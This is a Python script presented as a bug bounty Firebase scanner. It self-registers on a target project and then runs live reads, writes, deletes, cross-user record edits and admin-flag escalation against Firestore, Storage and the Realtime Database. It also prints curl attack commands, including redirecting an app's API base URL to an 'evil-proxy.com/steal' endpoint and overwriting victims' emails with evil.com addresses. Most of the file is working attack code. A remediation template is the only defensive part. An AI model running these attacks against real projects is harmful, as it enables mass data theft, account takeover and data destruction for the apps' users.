#!/usr/bin/env python3
"""
Firebase Security Scanner - Complete Bug Bounty Tool
Tests: Leaks, Read, Write, Delete, IDOR, CSP, Storage, RTDB, Config Hijack
"""

import requests
import sys
from datetime import datetime
from urllib.parse import urlparse

class Colors:
    CRITICAL = '\033[91m'  # Red
    HIGH = '\033[93m'      # Yellow
    SUCCESS = '\033[92m'   # Green
    INFO = '\033[94m'      # Blue
    RESET = '\033[0m'

class FirebaseScanner:
    def __init__(self):
        self.api_key = None
        self.project_id = None
        self.storage_bucket = None
        self.app_url = None
        self.token = None
        self.user_uid = None
        self.findings = []
        self.curl_commands = []

    def banner(self):
        print(f"""
{Colors.CRITICAL}╔══════════════════════════════════════════════════════════════════════╗
║     ███████╗██╗██████╗ ███████╗    ███████╗ ██████╗ █████╗ ███╗   ██╗ ║
║     ██╔════╝██║██╔══██╗██╔════╝    ██╔════╝██╔════╝██╔══██╗████╗  ██║ ║
║     █████╗  ██║██████╔╝█████╗      ███████╗██║     ███████║██╔██╗ ██║ ║
║     ██╔══╝  ██║██╔══██╗██╔══╝      ╚════██║██║     ██╔══██║██║╚██╗██║ ║
║     ██║     ██║██║  ██║███████╗    ███████║╚██████╗██║  ██║██║ ╚████║ ║
║     ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝ ║
║                    Firebase Security Scanner v2.0                     ║
║                         Bug Bounty Edition                            ║
╚══════════════════════════════════════════════════════════════════════╝{Colors.RESET}
        """)

    def get_config(self):
        print(f"{Colors.INFO}[*] Enter Firebase Configuration{Colors.RESET}\n")
        print("    (Paste from source code - only API Key & Project ID required)\n")

        self.api_key = input("    API Key: ").strip().replace('"', '').replace(',', '')
        if not self.api_key:
            print("[!] API Key is required!")
            sys.exit(1)

        self.project_id = input("    Project ID: ").strip().replace('"', '').replace(',', '')
        if not self.project_id:
            print("[!] Project ID is required!")
            sys.exit(1)

        self.storage_bucket = input("    Storage Bucket (Enter to skip): ").strip().replace('"', '').replace(',', '')
        if not self.storage_bucket:
            self.storage_bucket = f"{self.project_id}.appspot.com"

        self.app_url = input("    App URL for CSP test (Enter to skip): ").strip()

        print(f"\n{Colors.SUCCESS}[+] Configuration:{Colors.RESET}")
        print(f"    Project: {self.project_id}")
        print(f"    Bucket:  {self.storage_bucket}")

    def log(self, level, msg):
        colors = {
            "CRITICAL": Colors.CRITICAL,
            "HIGH": Colors.HIGH,
            "VULN": Colors.CRITICAL,
            "OK": Colors.SUCCESS,
            "INFO": Colors.INFO,
            "SKIP": Colors.INFO
        }
        color = colors.get(level, Colors.RESET)
        print(f"    {color}[{level}]{Colors.RESET} {msg}")

    def add_finding(self, severity, vuln_type, title, description, curl_cmd=None, impact=None):
        self.findings.append({
            "severity": severity,
            "type": vuln_type,
            "title": title,
            "description": description,
            "impact": impact
        })
        if curl_cmd:
            self.curl_commands.append({"title": title, "command": curl_cmd})

    # ==================== TEST 1: OPEN REGISTRATION ====================
    def test_registration(self):
        print(f"\n{Colors.INFO}[1/12] Testing Open Registration...{Colors.RESET}")

        url = f"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={self.api_key}"
        test_email = f"scanner_{datetime.now().strftime('%H%M%S')}@security-test.com"
        payload = {"email": test_email, "password": "ScannerTest123!", "returnSecureToken": True}

        curl = f'''curl -X POST "{url}" \\
  -H "Content-Type: application/json" \\
  -d '{{"email": "attacker@example.com", "password": "Password123!", "returnSecureToken": true}}'
'''
        try:
            r = requests.post(url, json=payload, timeout=10)
            if r.status_code == 200:
                data = r.json()
                self.token = data.get("idToken")
                self.user_uid = data.get("localId")
                self.log("VULN", f"Open registration ENABLED! Registered: {test_email}")
                self.add_finding("INFO", "AUTH", "Open Registration",
                    "Anyone can register without restrictions - entry point for attacks", curl)
                return True
            else:
                self.log("OK", "Registration restricted")
                return False
        except Exception as e:
            self.log("INFO", f"Error: {e}")
            return False

    # ==================== TEST 2: FIRESTORE READ (DATA LEAK) ====================
    def test_firestore_read(self):
        print(f"\n{Colors.INFO}[2/12] Testing Firestore READ Access (Data Leak)...{Colors.RESET}")

        if not self.token:
            self.log("SKIP", "No token")
            return

        collections = [
            "users", "app_config", "configs", "settings", "products", "orders",
            "payments", "transactions", "customers", "admin", "secrets", "api_keys",
            "tokens", "sessions", "logs", "messages", "notifications", "feedback",
            "addresses", "cards", "profiles", "accounts", "inventory", "analytics",
            "reports", "audit", "credentials", "keys", "config", "metadata"
        ]

        headers = {"Authorization": f"Bearer {self.token}"}
        readable = []
        total_docs = 0
        pii_found = []

        for coll in collections:
            url = f"https://firestore.googleapis.com/v1/projects/{self.project_id}/databases/(default)/documents/{coll}"
            try:
                r = requests.get(url, headers=headers, timeout=5)
                if r.status_code == 200:
                    docs = r.json().get("documents", [])
                    if docs:
                        readable.append({"name": coll, "count": len(docs)})
                        total_docs += len(docs)
                        self.log("VULN", f"'{coll}' READABLE - {len(docs)} documents exposed")

                        # Check for PII
                        for doc in docs[:2]:
                            fields = doc.get("fields", {})
                            for pii in ["email", "phone", "address", "ssn", "password", "card", "dob", "phone_number"]:
                                if pii in str(fields).lower():
                                    pii_found.append(pii)
            except:
                pass

        if readable:
            curl = f'''# Enumerate collection data
curl -X GET "https://firestore.googleapis.com/v1/projects/{self.project_id}/databases/(default)/documents/users" \\
  -H "Authorization: Bearer $TOKEN"
'''
            self.add_finding("HIGH", "DATA_LEAK", "Firestore Data Exposure",
                f"{len(readable)} collections readable with {total_docs} total documents. PII detected: {list(set(pii_found)) if pii_found else 'Check manually'}",
                curl, "Mass data exposure, potential GDPR violation")
        else:
            self.log("OK", "No collections accessible")

    # ==================== TEST 3: FIRESTORE WRITE ====================
    def test_firestore_write(self):
        print(f"\n{Colors.INFO}[3/12] Testing Firestore WRITE Access...{Colors.RESET}")

        if not self.token:
            self.log("SKIP", "No token")
            return

        headers = {"Authorization": f"Bearer {self.token}"}
        test_colls = ["users", "app_config", "configs", "products", "test"]
        writable = []

        for coll in test_colls:
            url = f"https://firestore.googleapis.com/v1/projects/{self.project_id}/databases/(default)/documents/{coll}?documentId=_scanner_write_test_"
            payload = {"fields": {"_scanner_test": {"stringValue": "write_test"}}}
            try:
                r = requests.post(url, headers=headers, json=payload, timeout=5)
                if r.status_code in [200, 201]:
                    writable.append(coll)
                    self.log("VULN", f"'{coll}' is WRITABLE!")
                    # Cleanup
                    requests.delete(f"https://firestore.googleapis.com/v1/projects/{self.project_id}/databases/(default)/documents/{coll}/_scanner_write_test_", headers=headers)
            except:
                pass

        if writable:
            curl = f'''# Create/modify document
curl -X PATCH "https://firestore.googleapis.com/v1/projects/{self.project_id}/databases/(default)/documents/users/VICTIM_ID" \\
  -H "Authorization: Bearer $TOKEN" \\
  -H "Content-Type: application/json" \\
  -d '{{"fields": {{"email": {{"stringValue": "hijacked@evil.com"}}, "is_admin": {{"booleanValue": true}}}}}}'
'''
            self.add_finding("CRITICAL", "WRITE", "Firestore Write Access",
                f"Collections writable: {writable}. Attacker can inject/modify data.",
                curl, "Data manipulation, account takeover, privilege escalation")

    # ==================== TEST 4: IDOR/BOLA (Other Users) ====================
    def test_idor(self):
        print(f"\n{Colors.INFO}[4/12] Testing IDOR/BOLA (Access Other Users)...{Colors.RESET}")

        if not self.token:
            self.log("SKIP", "No token")
            return

        headers = {"Authorization": f"Bearer {self.token}"}
        url = f"https://firestore.googleapis.com/v1/projects/{self.project_id}/databases/(default)/documents/users"

        try:
            r = requests.get(url, headers=headers, timeout=10)
            if r.status_code == 200:
                docs = r.json().get("documents", [])
                other_users = [d for d in docs if self.user_uid not in d.get("name", "")]

                if other_users:
                    self.log("CRITICAL", f"IDOR CONFIRMED! Can access {len(other_users)} OTHER users!")

                    # Try to modify another user
                    victim_path = other_users[0].get("name", "").split("documents/")[-1]
                    if victim_path:
                        mod_url = f"https://firestore.googleapis.com/v1/projects/{self.project_id}/databases/(default)/documents/{victim_path}"
                        test_payload = {"fields": {"_idor_test": {"stringValue": "vulnerable"}}}
                        r2 = requests.patch(mod_url, headers=headers, json=test_payload, timeout=5)
                        if r2.status_code == 200:
                            self.log("CRITICAL", "Can MODIFY other users' data!")
                            # Revert
                            requests.patch(mod_url, headers=headers, json={"fields": {}}, timeout=5)

                    curl = f'''# Read other user's data
curl -X GET "https://firestore.googleapis.com/v1/projects/{self.project_id}/databases/(default)/documents/users/VICTIM_USER_ID" \\
  -H "Authorization: Bearer $TOKEN"

# Modify other user's data
curl -X PATCH "https://firestore.googleapis.com/v1/projects/{self.project_id}/databases/(default)/documents/users/VICTIM_USER_ID" \\
  -H "Authorization: Bearer $TOKEN" \\
  -H "Content-Type: application/json" \\
  -d '{{"fields": {{"email": {{"stringValue": "attacker@evil.com"}}}}}}'
'''
                    self.add_finding("CRITICAL", "IDOR", "IDOR/BOLA - Access Other Users",
                        f"Can read/modify {len(other_users)} other users' documents without authorization",
                        curl, "Full account takeover, mass data breach, privacy violation")
                else:
                    self.log("INFO", "Only own user visible (may still be vulnerable)")
            else:
                self.log("OK", "Users collection protected")
        except Exception as e:
            self.log("INFO", f"Error: {e}")

    # ==================== TEST 5: DESTRUCTIVE DELETE ====================
    def test_delete(self):
        print(f"\n{Colors.INFO}[5/12] Testing DELETE Access (Data Destruction)...{Colors.RESET}")

        if not self.token:
            self.log("SKIP", "No token")
            return

        headers = {"Authorization": f"Bearer {self.token}"}

        # Create test doc then delete
        create_url = f"https://firestore.googleapis.com/v1/projects/{self.project_id}/databases/(default)/documents/users?documentId=_delete_test_"
        requests.post(create_url, headers=headers, json={"fields": {"test": {"stringValue": "x"}}}, timeout=5)

        del_url = f"https://firestore.googleapis.com/v1/projects/{self.project_id}/databases/(default)/documents/users/_delete_test_"
        try:
            r = requests.delete(del_url, headers=headers, timeout=5)
            if r.status_code == 200:
                self.log("CRITICAL", "DELETE operations ALLOWED!")
                curl = f'''# Delete any document (DESTRUCTIVE!)
curl -X DELETE "https://firestore.googleapis.com/v1/projects/{self.project_id}/databases/(default)/documents/users/VICTIM_DOC_ID" \\
  -H "Authorization: Bearer $TOKEN"
'''
                self.add_finding("CRITICAL", "DELETE", "Data Destruction Possible",
                    "Any authenticated user can DELETE documents",
                    curl, "Ransomware risk, total data loss, business disruption")
            else:
                self.log("OK", "Delete blocked")
        except:
            pass

    # ==================== TEST 6: CONFIG HIJACK ====================
    def test_config_hijack(self):
        print(f"\n{Colors.INFO}[6/12] Testing Config Hijack (API Redirect)...{Colors.RESET}")

        if not self.token:
            self.log("SKIP", "No token")
            return

        headers = {"Authorization": f"Bearer {self.token}"}
        config_paths = ["app_config/current", "configs/production", "config/settings", "settings/app"]

        for path in config_paths:
            url = f"https://firestore.googleapis.com/v1/projects/{self.project_id}/databases/(default)/documents/{path}"
            try:
                r = requests.get(url, headers=headers, timeout=5)
                if r.status_code == 200:
                    fields = r.json().get("fields", {})
                    sensitive = [k for k in fields.keys() if any(x in k.lower() for x in ["url", "api", "endpoint", "host", "admin", "key", "secret"])]

                    if sensitive:
                        self.log("CRITICAL", f"Config '{path}' has sensitive fields: {sensitive}")

                        # Test write
                        test_url = f"{url}?updateMask.fieldPaths=_scanner_test"
                        r2 = requests.patch(test_url, headers=headers, json={"fields": {"_scanner_test": {"stringValue": "x"}}}, timeout=5)
                        if r2.status_code == 200:
                            self.log("CRITICAL", "Config is WRITABLE - API hijack possible!")
                            # Cleanup
                            requests.patch(test_url, headers=headers, json={"fields": {}}, timeout=5)

                        curl = f'''# Read current config
curl -X GET "https://firestore.googleapis.com/v1/projects/{self.project_id}/databases/(default)/documents/{path}" \\
  -H "Authorization: Bearer $TOKEN"

# Hijack API endpoint (redirect all traffic)
curl -X PATCH "https://firestore.googleapis.com/v1/projects/{self.project_id}/databases/(default)/documents/{path}?updateMask.fieldPaths=api_base_url" \\
  -H "Authorization: Bearer $TOKEN" \\
  -H "Content-Type: application/json" \\
  -d '{{"fields": {{"api_base_url": {{"stringValue": "https://evil-proxy.com/steal"}}}}}}'
'''
                        self.add_finding("CRITICAL", "CONFIG", "Application Config Hijack",
                            f"Config at '{path}' is readable/writable. Fields: {sensitive}",
                            curl, "Redirect all app traffic to attacker, credential theft, full compromise")
                        return
            except:
                pass

        self.log("OK", "No writable config found")

    # ==================== TEST 7: PRIVILEGE ESCALATION ====================
    def test_privilege_escalation(self):
        print(f"\n{Colors.INFO}[7/12] Testing Privilege Escalation...{Colors.RESET}")

        if not self.token or not self.user_uid:
            self.log("SKIP", "No token/UID")
            return

        headers = {"Authorization": f"Bearer {self.token}"}

        # Try to set admin on own account
        url = f"https://firestore.googleapis.com/v1/projects/{self.project_id}/databases/(default)/documents/users/{self.user_uid}"
        payload = {"fields": {"is_admin": {"booleanValue": True}, "role": {"stringValue": "admin"}}}

        try:
            r = requests.patch(url, headers=headers, json=payload, timeout=5)
            if r.status_code == 200:
                self.log("CRITICAL", "Can set is_admin/role on own account!")
                curl = f'''# Escalate privileges
curl -X PATCH "https://firestore.googleapis.com/v1/projects/{self.project_id}/databases/(default)/documents/users/YOUR_UID" \\
  -H "Authorization: Bearer $TOKEN" \\
  -H "Content-Type: application/json" \\
  -d '{{"fields": {{"is_admin": {{"booleanValue": true}}, "role": {{"stringValue": "superadmin"}}}}}}'
'''
                self.add_finding("HIGH", "PRIVESC", "Privilege Escalation",
                    "User can modify their own admin/role fields",
                    curl, "Gain admin access, bypass authorization")
        except:
            pass

    # ==================== TEST 8: STORAGE BUCKET ====================
    def test_storage(self):
        print(f"\n{Colors.INFO}[8/12] Testing Firebase Storage...{Colors.RESET}")

        url = f"https://firebasestorage.googleapis.com/v0/b/{self.storage_bucket}/o"

        # Public access
        try:
            r = requests.get(url, timeout=10)
            if r.status_code == 200:
                items = r.json().get("items", [])
                self.log("CRITICAL", f"Storage PUBLICLY listable! {len(items)} files")

                curl = f'''# List all files in storage
curl "https://firebasestorage.googleapis.com/v0/b/{self.storage_bucket}/o"

# Download a file
curl "https://firebasestorage.googleapis.com/v0/b/{self.storage_bucket}/o/PATH%2Ffile.jpg?alt=media"
'''
                self.add_finding("HIGH", "STORAGE", "Storage Bucket Exposed",
                    f"Public listing enabled, {len(items)} files accessible",
                    curl, "Data leak, sensitive file exposure")
            else:
                self.log("OK", f"Public listing blocked ({r.status_code})")
        except Exception as e:
            self.log("INFO", f"Error: {e}")

        # Authenticated access
        if self.token:
            headers = {"Authorization": f"Bearer {self.token}"}
            try:
                r = requests.get(url, headers=headers, timeout=10)
                if r.status_code == 200:
                    items = r.json().get("items", [])
                    if items:
                        self.log("VULN", f"Auth'd storage access: {len(items)} files")
            except:
                pass

    # ==================== TEST 9: REALTIME DATABASE ====================
    def test_rtdb(self):
        print(f"\n{Colors.INFO}[9/12] Testing Realtime Database...{Colors.RESET}")

        urls = [
            f"https://{self.project_id}.firebaseio.com/.json",
            f"https://{self.project_id}-default-rtdb.firebaseio.com/.json"
        ]

        for url in urls:
            try:
                r = requests.get(url, timeout=10)
                if r.status_code == 200 and r.text not in ["null", "{}"]:
                    self.log("CRITICAL", f"RTDB PUBLICLY READABLE!")
                    curl = f'''# Read entire Realtime Database
curl "{url}"

# Write to RTDB (if writable)
curl -X PUT "{url.replace('.json', '/test.json')}" -d '{{"pwned": true}}'
'''
                    self.add_finding("CRITICAL", "RTDB", "Realtime Database Exposed",
                        "Firebase RTDB allows unauthenticated read",
                        curl, "Complete database exposure")
                    return
                elif r.status_code == 401:
                    self.log("OK", "RTDB requires auth")
            except:
                pass

    # ==================== TEST 10: CSP HEADERS ====================
    def test_csp(self):
        print(f"\n{Colors.INFO}[10/12] Testing CSP & Security Headers...{Colors.RESET}")

        if not self.app_url:
            self.log("SKIP", "No app URL provided")
            return

        try:
            r = requests.get(self.app_url, timeout=10)
            headers = r.headers

            missing = []
            if "content-security-policy" not in [h.lower() for h in headers]:
                missing.append("Content-Security-Policy")
            if "x-frame-options" not in [h.lower() for h in headers]:
                missing.append("X-Frame-Options")
            if "x-content-type-options" not in [h.lower() for h in headers]:
                missing.append("X-Content-Type-Options")

            if missing:
                self.log("VULN", f"Missing headers: {missing}")
                curl = f'''# Check security headers
curl -I "{self.app_url}"
'''
                self.add_finding("MEDIUM", "CSP", "Missing Security Headers",
                    f"Missing: {', '.join(missing)}",
                    curl, "XSS risk, clickjacking, MIME sniffing")
            else:
                self.log("OK", "Security headers present")
        except Exception as e:
            self.log("INFO", f"Error: {e}")

    # ==================== TEST 11: API KEY RESTRICTIONS ====================
    def test_api_key(self):
        print(f"\n{Colors.INFO}[11/12] Testing API Key Restrictions...{Colors.RESET}")

        # Test various APIs with this key
        tests = [
            ("Maps API", f"https://maps.googleapis.com/maps/api/staticmap?center=0,0&zoom=1&size=1x1&key={self.api_key}"),
            ("Places API", f"https://maps.googleapis.com/maps/api/place/textsearch/json?query=test&key={self.api_key}"),
        ]

        unrestricted = []
        for name, url in tests:
            try:
                r = requests.get(url, timeout=5)
                if r.status_code == 200 and "error" not in r.text.lower():
                    unrestricted.append(name)
                    self.log("VULN", f"{name} accessible with this key!")
            except:
                pass

        if unrestricted:
            self.add_finding("LOW", "APIKEY", "Unrestricted API Key",
                f"Key works for: {unrestricted}. May allow billing abuse.",
                None, "Potential billing abuse if key has no restrictions")

    # ==================== TEST 12: CLOUD FUNCTIONS ====================
    def test_functions(self):
        print(f"\n{Colors.INFO}[12/12] Testing Cloud Functions...{Colors.RESET}")

        regions = ["us-central1", "us-east1", "europe-west1", "asia-east1"]
        common_functions = ["api", "webhook", "auth", "process", "handler", "callback"]

        for region in regions:
            for func in common_functions:
                url = f"https://{region}-{self.project_id}.cloudfunctions.net/{func}"
                try:
                    r = requests.get(url, timeout=3)
                    if r.status_code != 404:
                        self.log("INFO", f"Function found: {url} ({r.status_code})")
                except:
                    pass

    # ==================== GENERATE REPORT ====================
    def generate_report(self):
        print(f"\n{'='*75}")
        print(f"{Colors.CRITICAL}                           SCAN RESULTS{Colors.RESET}")
        print(f"{'='*75}")

        if not self.findings:
            print(f"\n{Colors.SUCCESS}[+] No vulnerabilities found!{Colors.RESET}")
            return

        # Group by severity
        severity_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
        self.findings.sort(key=lambda x: severity_order.get(x["severity"], 5))

        # Summary
        crit = len([f for f in self.findings if f["severity"] == "CRITICAL"])
        high = len([f for f in self.findings if f["severity"] == "HIGH"])
        med = len([f for f in self.findings if f["severity"] == "MEDIUM"])

        print(f"\n{Colors.CRITICAL}[!] CRITICAL: {crit}  {Colors.HIGH}HIGH: {high}  {Colors.INFO}MEDIUM: {med}{Colors.RESET}\n")

        # Detailed findings
        for i, f in enumerate(self.findings, 1):
            sev = f["severity"]
            color = Colors.CRITICAL if sev == "CRITICAL" else Colors.HIGH if sev == "HIGH" else Colors.INFO

            print(f"{color}[{sev}] {f['type']}: {f['title']}{Colors.RESET}")
            print(f"       {f['description']}")
            if f.get("impact"):
                print(f"       Impact: {f['impact']}")
            print()

        # CURL Commands
        print(f"\n{'='*75}")
        print(f"{Colors.INFO}                          CURL COMMANDS{Colors.RESET}")
        print(f"{'='*75}")

        print(f"""
{Colors.SUCCESS}### STEP 0: Get Token ###{Colors.RESET}
curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={self.api_key}" \\
  -H "Content-Type: application/json" \\
  -d '{{"email": "attacker@test.com", "password": "Password123!", "returnSecureToken": true}}'

# Save the idToken as $TOKEN
export TOKEN="<paste idToken here>"
""")

        for cmd in self.curl_commands:
            print(f"\n{Colors.HIGH}### {cmd['title']} ###{Colors.RESET}")
            print(cmd['command'])

        # Report Template
        if crit > 0 or high > 0:
            print(f"\n{'='*75}")
            print(f"{Colors.SUCCESS}                    BUG BOUNTY REPORT TEMPLATE{Colors.RESET}")
            print(f"{'='*75}")

            top_finding = self.findings[0]
            print(f"""
## Title
{top_finding['title']} in Firebase Project {self.project_id}

## Severity
{top_finding['severity']}

## VRT Category
Broken Access Control (BAC) > Insecure Direct Object References (IDOR)

## Summary
The Firebase Firestore database for project `{self.project_id}` has insecure
security rules allowing any authenticated user to access/modify data they
should not have access to.

## Impact
{top_finding.get('impact', top_finding['description'])}

## Steps to Reproduce
1. Register an account using the Firebase Auth API:
   POST https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={self.api_key}
   Body: {{"email": "attacker@test.com", "password": "Test123!", "returnSecureToken": true}}

2. Use the returned idToken as Bearer authentication

3. Access protected resources:
   [Include relevant curl commands from above]

## Remediation
Update Firestore Security Rules:
```javascript
rules_version = '2';
service cloud.firestore {{
  match /databases/{{database}}/documents {{
    match /users/{{userId}} {{
      allow read, write: if request.auth != null && request.auth.uid == userId;
    }}
    match /app_config/{{doc}} {{
      allow read: if true;
      allow write: if false; // Admin SDK only
    }}
  }}
}}
```
""")

    def run(self):
        self.banner()
        self.get_config()

        print(f"\n{'='*75}")
        print(f"{Colors.INFO}                    STARTING SECURITY SCAN{Colors.RESET}")
        print(f"{'='*75}")

        self.test_registration()
        self.test_firestore_read()
        self.test_firestore_write()
        self.test_idor()
        self.test_delete()
        self.test_config_hijack()
        self.test_privilege_escalation()
        self.test_storage()
        self.test_rtdb()
        self.test_csp()
        self.test_api_key()
        self.test_functions()

        self.generate_report()

        print(f"\n{Colors.SUCCESS}[*] Scan complete. Act responsibly!{Colors.RESET}\n")


if __name__ == "__main__":
    scanner = FirebaseScanner()
    scanner.run()
